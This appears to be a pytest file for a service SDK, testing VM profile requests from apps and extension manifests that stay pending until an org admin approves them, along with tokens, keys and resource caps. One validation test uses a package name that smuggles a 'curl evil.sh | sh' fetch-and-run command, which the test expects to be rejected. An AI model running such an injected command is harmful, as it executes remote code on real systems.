"""VM profile requests: an app asks for its own VM, an extension's manifest for its users',
and nothing runs until an org admin approves (igni's service-identity §12)."""

from __future__ import annotations

import asyncio
import json
import time
from datetime import UTC, datetime
from pathlib import Path

import pytest
from fastapi import FastAPI
from pydantic import ValidationError

from igni_service import (
    IgniApp,
    IgniService,
    IgniUnavailable,
    VmPackages,
    VmProfileRefused,
    VmProfileRequest,
)
from igni_service.bundle.archive import BundleArchive
from igni_service.testing import (
    FakeCaps,
    FakeIgni,
    FakeVmProfiles,
    NoVmProfileRequest,
    SettingsOverrides,
    VmProfileSubject,
)
from igni_service.testing_vm_rules import FakeProfile, ManifestVm, Resolved
from igni_service.urls import IgniPaths
from igni_service.vm_profiles import VmProfileRequestRecord

from .conftest import ORG, OTHER_ORG

BROWSER = VmProfileRequest(
    memory_mib=4096,
    normal_memory_mib=2048,
    vcpus=2,
    packages=VmPackages(apt=["chromium", "fonts-liberation"], npm=["@playwright/mcp"]),
    setup_script="ln -sf /usr/bin/chromium /usr/local/bin/chromium-browser\n",
)


@pytest.fixture
async def app(fake: FakeIgni) -> IgniApp:
    return fake.app("app-review-bot", org_id=ORG, name="Review bot")


class TestAnAppAsksForItsOwnVm:
    async def test_a_request_is_pending_and_sends_only_what_was_set(
        self, app: IgniApp, fake: FakeIgni
    ) -> None:
        record = await app.vm_profile.request(BROWSER)

        assert record.is_pending
        assert record.subject.kind == "app" and record.subject.id == "app-review-bot"
        assert record.requested.packages.npm == ["@playwright/mcp"]
        # What was left out is the Standard value, filled in by igni.
        assert record.requested.volume_gib == 10
        [put] = [s for s in fake.traffic.requests_to(IgniPaths.app_vm_profile_request(app.app_id))]
        assert put.method == "PUT"
        assert put.headers["authorization"].startswith("Bearer app-")
        assert "volume_gib" not in put.json_body()
        assert put.json_body()["packages"]["apt"] == ["chromium", "fonts-liberation"]

    async def test_nothing_runs_until_an_org_admin_approves(
        self, app: IgniApp, fake: FakeIgni
    ) -> None:
        await app.vm_profile.request(BROWSER)

        before = await app.vm_profile.effective()
        assert before.profile_name == "Standard" and before.packages.apt == []

        fake.vm_profiles.approve(ORG, VmProfileSubject.app(app.app_id))
        after = await app.vm_profile.effective()
        record = await app.vm_profile.status()

        assert record is not None and record.is_approved and record.profile_id
        assert after.profile_id == record.profile_id
        assert after.packages.apt == ["chromium", "fonts-liberation"]
        assert after.setup_script == BROWSER.setup_script
        assert after.vcpus == 2 and after.volume_gib == 10

    async def test_the_same_request_again_keeps_its_state_and_a_changed_one_is_pending(
        self, app: IgniApp, fake: FakeIgni
    ) -> None:
        first = await app.vm_profile.request(BROWSER)
        fake.vm_profiles.approve(ORG, VmProfileSubject.app(app.app_id))

        again = await app.vm_profile.request(BROWSER)
        assert again.is_approved and again.version == first.version

        changed = await app.vm_profile.request(BROWSER.model_copy(update={"vcpus": 4}))
        assert changed.is_pending and changed.version != first.version
        # The VM keeps what was approved until the change is.
        assert (await app.vm_profile.effective()).vcpus == 2

    async def test_a_rejection_says_why_and_changes_nothing(
        self, app: IgniApp, fake: FakeIgni
    ) -> None:
        await app.vm_profile.request(BROWSER)
        fake.vm_profiles.reject(
            ORG, VmProfileSubject.app(app.app_id), reason="No browsers in production"
        )

        record = await app.vm_profile.status()

        assert record is not None and record.is_rejected
        assert record.reason == "No browsers in production"
        assert record.decided_by is not None and record.decided_by.acting_as == "org_admin"
        assert (await app.vm_profile.effective()).profile_name == "Standard"

    async def test_no_request_yet_is_none(self, app: IgniApp) -> None:
        assert await app.vm_profile.status() is None

    async def test_more_than_the_platform_allows_is_refused_in_igni_s_words(
        self, app: IgniApp
    ) -> None:
        with pytest.raises(VmProfileRefused) as refused:
            await app.vm_profile.request(VmProfileRequest(memory_mib=65536))

        assert refused.value.status == 400
        assert "8192 MiB" in refused.value.detail

    async def test_a_package_that_is_a_shell_line_is_caught_before_it_is_sent(self) -> None:
        with pytest.raises(ValidationError):
            VmPackages(apt=["chromium; curl evil.sh | sh"])

    async def test_an_app_cannot_ask_for_another_app(self, fake: FakeIgni) -> None:
        mine = fake.app("app-mine", org_id=ORG)
        fake.app("app-theirs", org_id=ORG)
        response = await mine.request(
            "PUT", IgniPaths.app_vm_profile_request("app-theirs"), json={}
        )

        assert response.status_code == 403

    async def test_an_app_igni_does_not_know_gets_no_token(self, fake: FakeIgni) -> None:
        stranger = fake.app("app-gone", org_id=ORG)
        del fake.clients.clients["app-gone"]

        with pytest.raises(IgniUnavailable, match="refused this app a token"):
            await stranger.vm_profile.request(BROWSER)

    async def test_the_token_is_kept_until_it_is_nearly_expired(
        self, app: IgniApp, fake: FakeIgni
    ) -> None:
        await app.vm_profile.effective()
        await app.vm_profile.effective()
        assert fake.oauth.grants == ["client_credentials"]

        fake.clock.advance(600)  # type: ignore[attr-defined]
        await app.vm_profile.effective()
        assert fake.oauth.grants == ["client_credentials", "client_credentials"]

    async def test_the_public_key_is_what_the_org_admin_pastes(
        self, app: IgniApp, fake: FakeIgni
    ) -> None:
        jwks = await app.public_jwks()

        [key] = jwks.keys
        assert "d" not in key.as_dict()
        assert key.n == fake.clients.clients["app-review-bot"].jwk.n
        assert await app.thumbprint() == fake.clients.clients["app-review-bot"].thumbprint

    async def test_what_is_pasted_is_the_json_web_key_set_and_nothing_else(
        self, app: IgniApp
    ) -> None:
        """The set's JSON, as the README prints it: the four public members and the key's name."""
        pasted = json.loads((await app.public_jwks()).model_dump_json())

        [key] = pasted["keys"]
        assert list(pasted) == ["keys"]
        assert set(key) == {"kty", "use", "alg", "kid", "n", "e"}
        assert (key["kty"], key["use"], key["alg"]) == ("RSA", "sig", "RS256")
        assert key["kid"] == await app.thumbprint()

    async def test_it_closes_as_a_context_manager(self, fake: FakeIgni) -> None:
        async with fake.app("app-short", org_id=ORG) as short:
            assert (await short.vm_profile.effective()).profile_name == "Standard"


def write_bundle(tmp_path: Path, vm: dict[str, object] | None, *, version: str = "1.0.0") -> Path:
    staging = tmp_path / f"staging-{version}"
    staging.mkdir(exist_ok=True)
    manifest: dict[str, object] = {"id": "acme.browser", "version": version, "name": "Browser"}
    if vm is not None:
        manifest["vm"] = vm
    (staging / "manifest.json").write_text(json.dumps(manifest))
    out = tmp_path / f"bundle-{version}.tar.gz"
    BundleArchive.write(staging, out)
    return out


async def shipped(fake: FakeIgni, bundle: Path) -> IgniService:
    igni = fake.service(fake.settings(SettingsOverrides(extension_bundle_path=str(bundle))))
    app = FastAPI(lifespan=igni.lifespan)
    async with app.router.lifespan_context(app):
        await asyncio.wait_for(igni.connection.registration.registered.wait(), timeout=5)
        await asyncio.sleep(0.05)
    fake.clients.approve()
    return fake.service(
        fake.settings(SettingsOverrides(extension_bundle_path=str(bundle))),
        key_store=igni.connection.key.store,
    )


MANIFEST_VM: dict[str, object] = {
    "packages": {"apt": ["chromium"], "npm": ["@playwright/mcp"]},
    "setupScript": "true\n",
    "memoryMib": 4096,
    "vcpus": 2,
}


class TestAServiceReadsItsExtensionsRequest:
    async def test_it_is_pending_in_each_organisation_until_that_admin_approves(
        self, fake: FakeIgni, tmp_path: Path
    ) -> None:
        igni = await shipped(fake, write_bundle(tmp_path, MANIFEST_VM))

        here = await igni.host(ORG).extension_vm_profile()
        assert here.extension_id == "acme.browser"
        assert here.request is not None and here.request.is_pending
        assert here.request.requested.packages.apt == ["chromium"]
        assert here.request.requested.vcpus == 2
        assert here.profile is None

        approved = fake.vm_profiles.approve(ORG, VmProfileSubject.extension("acme.browser"))
        assert approved.profile_id is not None
        fake.vm_profiles.assign(ORG, approved.profile_id, groups=2)
        here = await igni.host(ORG).extension_vm_profile()
        there = await igni.host(OTHER_ORG).extension_vm_profile()

        assert here.request is not None and here.request.is_approved
        assert here.profile is not None and here.profile.packages.npm == ["@playwright/mcp"]
        assert here.assigned.groups == 2
        assert there.request is not None and there.request.is_pending
        [seen, *_] = fake.traffic.requests_to(IgniPaths.SERVICE_VM_PROFILE)
        assert seen.headers["authorization"].startswith("Bearer service-")

    async def test_a_service_whose_extension_asks_for_nothing_has_no_request(
        self, fake: FakeIgni, tmp_path: Path
    ) -> None:
        igni = await shipped(fake, write_bundle(tmp_path, None))

        answer = await igni.host(ORG).extension_vm_profile()

        assert answer.extension_id is None and answer.request is None


class TestInternetIsAskedForAndInternalByDefault:
    """C12: a VM reaches the internet only when its profile says so — a grant an org admin approves."""

    def test_left_out_it_is_not_sent_and_set_it_is(self) -> None:
        assert "internet" not in BROWSER.body()
        assert VmProfileRequest(internet=True).body() == {"internet": True}
        assert VmProfileRequest(internet=False).body() == {"internet": False}

    def test_a_profile_from_an_older_igni_server_is_internal_only(self) -> None:
        from igni_service.vm_profiles import EffectiveVmProfile, RequestedVmProfile

        older = {"profile_id": "p", "profile_name": "Standard", "memory_mib": 4096}
        older |= {"normal_memory_mib": 1024, "vcpus": 1, "volume_max_gib": 50}
        assert EffectiveVmProfile.model_validate(older).internet is False
        requested = RequestedVmProfile.model_validate(
            {"memory_mib": 4096, "normal_memory_mib": 1024, "vcpus": 1}
            | {"volume_gib": 10, "volume_max_gib": 50}
        )
        assert requested.internet is False

    async def test_an_app_asking_for_internet_gets_it_only_once_approved(
        self, app: IgniApp, fake: FakeIgni
    ) -> None:
        record = await app.vm_profile.request(VmProfileRequest(internet=True))

        assert record.is_pending and record.requested.internet is True
        [put] = fake.traffic.requests_to(IgniPaths.app_vm_profile_request(app.app_id))
        assert put.json_body() == {"internet": True}
        assert (await app.vm_profile.effective()).internet is False

        fake.vm_profiles.approve(ORG, VmProfileSubject.app(app.app_id))
        assert (await app.vm_profile.effective()).internet is True

    async def test_asking_for_internet_after_an_approval_is_pending_again(
        self, app: IgniApp, fake: FakeIgni
    ) -> None:
        await app.vm_profile.request(BROWSER)
        fake.vm_profiles.approve(ORG, VmProfileSubject.app(app.app_id))

        again = await app.vm_profile.request(BROWSER.model_copy(update={"internet": True}))

        assert again.is_pending
        assert (await app.vm_profile.effective()).internet is False

    async def test_an_extension_s_manifest_asks_for_internet(
        self, fake: FakeIgni, tmp_path: Path
    ) -> None:
        igni = await shipped(fake, write_bundle(tmp_path, {**MANIFEST_VM, "internet": True}))

        here = await igni.host(ORG).extension_vm_profile()
        assert here.request is not None and here.request.requested.internet is True
        fake.vm_profiles.approve(ORG, VmProfileSubject.extension("acme.browser"))
        here = await igni.host(ORG).extension_vm_profile()
        assert here.profile is not None and here.profile.internet is True

    async def test_a_manifest_that_says_nothing_is_internal_only(
        self, fake: FakeIgni, tmp_path: Path
    ) -> None:
        igni = await shipped(fake, write_bundle(tmp_path, MANIFEST_VM))

        here = await igni.host(ORG).extension_vm_profile()
        assert here.request is not None and here.request.requested.internet is False
        fake.vm_profiles.approve(ORG, VmProfileSubject.extension("acme.browser"))
        here = await igni.host(ORG).extension_vm_profile()
        assert here.profile is not None and here.profile.internet is False


class TestTheNamesSayWhichThingTheyAnswer:
    """`request`, `status` and `effective` for an app; `extension_vm_profile` for a service.

    The old service name asked a reader to remember that `host.vm_profile()`
    was a request's status. It still works, and says what to call instead.
    """

    async def test_the_old_service_name_still_answers_and_warns(self, igni: IgniService) -> None:
        with pytest.warns(DeprecationWarning, match="extension_vm_profile"):
            answer = await igni.host(ORG).vm_profile()

        assert answer.org_id == ORG


class TestPlayingTheOrgAdmin:
    def test_approving_a_request_nobody_made_says_how_one_is_made(self, fake: FakeIgni) -> None:
        with pytest.raises(LookupError) as missing:
            fake.vm_profiles.approve(ORG, VmProfileSubject.extension("acme.example"))

        said = str(missing.value)
        assert "acme.example" in said and ORG in said
        assert "extension_vm_profile()" in said  # how an extension's request appears
        assert "vm_profile.request(" in said  # how an app's does

    def test_rejecting_one_says_the_same(self, fake: FakeIgni) -> None:
        with pytest.raises(LookupError, match="no VM profile request"):
            fake.vm_profiles.reject(ORG, VmProfileSubject.app("app-nobody"))

    def test_the_admin_decides_through_vm_profiles_with_a_subject(self, fake: FakeIgni) -> None:
        # `fake.approve_vm_profile(org, app=...)` and `VmProfileSubject.of` are gone:
        # one way to name whose request it is, and no name-exactly-one error.
        assert not hasattr(fake, "approve_vm_profile")
        assert not hasattr(fake, "reject_vm_profile")
        assert not hasattr(VmProfileSubject, "of")
        assert VmProfileSubject.app("app-1") == VmProfileSubject(kind="app", subject_id="app-1")
        assert VmProfileSubject.extension("acme.x") == VmProfileSubject(
            kind="extension", subject_id="acme.x"
        )

    def test_a_subject_named_by_kind_and_id_is_refused(self) -> None:
        profiles = FakeVmProfiles()
        profiles.app_put(ORG, "app-1", "Bot", b"{}")

        with pytest.raises(TypeError):
            profiles.approve(ORG, "app", "app-1")  # type: ignore[arg-type,call-arg]


class TestTheFakesVmProfilesOnTheirOwn:
    """`FakeVmProfiles` outside a `FakeIgni`, which hands it the fake's clock."""

    def test_they_are_made_without_a_clock_and_stamp_the_wall_time(self) -> None:
        profiles = FakeVmProfiles()

        answered = profiles.app_put(ORG, "app-1", "Bot", b'{"vcpus": 2}')

        assert answered.status_code == 201
        record = VmProfileRequestRecord.model_validate(answered.json())
        assert record.requested.vcpus == 2
        assert abs(record.requested_at.timestamp() - time.time()) < 60

    def test_a_clock_they_are_given_stamps_the_request_and_the_decision(self) -> None:
        now = [1_800_000_000.0]
        profiles = FakeVmProfiles(clock=lambda: now[0])

        profiles.app_put(ORG, "app-1", "Bot", b"{}")
        now[0] += 60
        decided = profiles.approve(ORG, VmProfileSubject.app("app-1"))

        assert decided.requested_at == datetime.fromtimestamp(1_800_000_000, UTC)
        assert decided.decided_at == datetime.fromtimestamp(1_800_000_060, UTC)

    def test_the_request_a_subject_made_is_read_back_and_one_never_made_is_said(self) -> None:
        profiles = FakeVmProfiles()
        made = VmProfileRequestRecord.model_validate(
            profiles.app_put(ORG, "app-1", "Bot", b'{"vcpus": 2}').json()
        )

        assert profiles.request(ORG, VmProfileSubject.app("app-1")) == made
        with pytest.raises(NoVmProfileRequest, match="^no VM profile request from app app-1 in"):
            profiles.request(OTHER_ORG, VmProfileSubject.app("app-1"))

    def test_a_missing_apps_request_says_first_how_an_app_asks(self) -> None:
        with pytest.raises(NoVmProfileRequest) as missing:
            FakeVmProfiles().approve(ORG, VmProfileSubject.app("app-1"))

        said = str(missing.value)
        assert said.index("vm_profile.request(") < said.index("extension_vm_profile()")

    def test_an_approval_is_by_the_admin_it_names_and_u_admin_otherwise(self) -> None:
        profiles = FakeVmProfiles()
        profiles.app_put(ORG, "app-1", "Bot", b"{}")
        profiles.app_put(ORG, "app-2", "Bot", b"{}")

        named = profiles.approve(ORG, VmProfileSubject.app("app-1"), by="u-ada")
        unnamed = profiles.reject(ORG, VmProfileSubject.app("app-2"))

        assert named.decided_by is not None and named.decided_by.id == "u-ada"
        assert unnamed.decided_by is not None and unnamed.decided_by.id == "u-admin"

    def test_a_rejection_keeps_its_reason_and_makes_no_profile(self) -> None:
        profiles = FakeVmProfiles()
        profiles.app_put(ORG, "app-1", "Bot", b'{"vcpus": 2}')

        rejected = profiles.reject(ORG, VmProfileSubject.app("app-1"), reason="Too big")

        assert (rejected.state, rejected.reason, rejected.profile_id) == (
            "rejected",
            "Too big",
            None,
        )
        assert profiles.request(ORG, VmProfileSubject.app("app-1")) == rejected
        assert (profiles.profiles, profiles.app_profiles) == ({}, {})

    def test_approving_again_replaces_the_profile_the_first_approval_made(self) -> None:
        profiles = FakeVmProfiles()
        subject = VmProfileSubject.app("app-1")
        profiles.app_put(ORG, "app-1", "Bot", b'{"vcpus": 2}')
        first = profiles.approve(ORG, subject)
        profiles.app_put(ORG, "app-1", "Bot", b'{"vcpus": 4}')

        second = profiles.approve(ORG, subject)

        assert second.profile_id == first.profile_id
        assert list(profiles.profiles) == [(ORG, first.profile_id)]
        assert profiles.profiles[(ORG, str(first.profile_id))].settings.vcpus == 4
        assert profiles.app_profiles == {(ORG, "app-1"): first.profile_id}

    def test_a_profile_for_a_subject_with_no_name_is_named_by_its_id(self) -> None:
        profiles = FakeVmProfiles()
        profiles.app_put(ORG, "app-1", "", b"{}")

        approved = profiles.approve(ORG, VmProfileSubject.app("app-1"))

        assert profiles.profiles[(ORG, str(approved.profile_id))].name == "app-1"

    async def test_approving_an_extension_gives_no_app_its_profile(
        self, fake: FakeIgni, tmp_path: Path
    ) -> None:
        igni = await shipped(fake, write_bundle(tmp_path, MANIFEST_VM))
        await igni.host(ORG).extension_vm_profile()

        approved = fake.vm_profiles.approve(ORG, VmProfileSubject.extension("acme.browser"))

        assert approved.profile_id is not None
        assert fake.vm_profiles.app_profiles == {}


class TestIgnisRulesForAProfile:
    """What the fake holds a request to, as igni server does (`testing_vm_rules`)."""

    def test_what_a_request_leaves_out_is_the_standard_profile(self) -> None:
        resolved = Resolved.of(VmProfileRequest(vcpus=2))

        assert resolved == Resolved.standard().model_copy(update={"vcpus": 2})

    def test_never_pausing_is_asked_for_explicitly_and_the_caps_refuse_it(self) -> None:
        profiles = FakeVmProfiles()

        answered = profiles.app_put(ORG, "app-1", "Bot", b'{"idle_before_pause_s": null}')

        assert answered.status_code == 400
        assert "awake idle for at most 3600 seconds" in answered.json()["detail"]

    def test_normal_memory_over_the_ceiling_is_malformed(self) -> None:
        profiles = FakeVmProfiles()

        answered = profiles.app_put(
            ORG, "app-1", "Bot", b'{"memory_mib": 1024, "normal_memory_mib": 2048}'
        )

        assert answered.status_code == 422
        assert "normal_memory_mib may not exceed memory_mib" in answered.json()["detail"]
        assert profiles.requests == {}

    def test_what_a_vm_gets_is_clamped_to_the_caps(self) -> None:
        caps = FakeCaps(max_memory_mib=2048, max_vcpus=2, max_volume_gib=20)
        big = Resolved.of(
            VmProfileRequest(
                memory_mib=8192,
                normal_memory_mib=4096,
                expected_memory_mib=3072,
                vcpus=8,
                idle_before_pause_s=None,
                volume_max_gib=100,
            )
        )

        served = caps.serve(FakeProfile(id="p-1", name="Big", settings=big))

        assert (served.memory_mib, served.normal_memory_mib, served.expected_memory_mib) == (
            2048,
            2048,
            2048,
        )
        assert served.vcpus == 2 and served.volume_max_gib == 20
        assert served.idle_before_pause_s == 3600, "never pausing is the longest the caps allow"

    def test_a_manifest_s_vm_is_read_in_its_own_camel_case(self) -> None:
        vm = ManifestVm.model_validate(
            {"memoryMib": 2048, "idleBeforePauseS": 60, "somethingNew": True}
        )

        assert Resolved.of(vm).memory_mib == 2048
        assert Resolved.of(vm).idle_before_pause_s == 60


class TestUploadingInATest:
    """`await fake.upload(bundle, igni)`: the service's upload, without a lifespan or a build."""

    async def test_an_extension_directory_is_uploaded_as_the_service_would(
        self, fake: FakeIgni, igni: IgniService, tmp_path: Path
    ) -> None:
        extension = tmp_path / "extension"
        (extension / "ui").mkdir(parents=True)
        (extension / "ui" / "index.html").write_text("<!doctype html>")
        (extension / "manifest.json").write_text(
            json.dumps({"id": "acme.example", "version": "1.0.0", "vm": {"memoryMib": 2048}})
        )

        held = await fake.upload(extension, igni)

        assert held.extension_id == "acme.example" and held.version == "1.0.0"
        answer = await igni.host(ORG).extension_vm_profile()
        assert answer.request is not None and answer.request.is_pending
        approved = fake.vm_profiles.approve(ORG, VmProfileSubject.extension("acme.example"))
        assert approved.is_approved

    async def test_a_built_bundle_is_uploaded_too(
        self, fake: FakeIgni, igni: IgniService, tmp_path: Path
    ) -> None:
        staging = tmp_path / "staging"
        staging.mkdir()
        (staging / "manifest.json").write_text(json.dumps({"id": "acme.example", "version": "2"}))
        archive = tmp_path / "extension-bundle.tar.gz"
        BundleArchive.write(staging, archive)

        held = await fake.upload(archive, igni)

        assert held.version == "2"
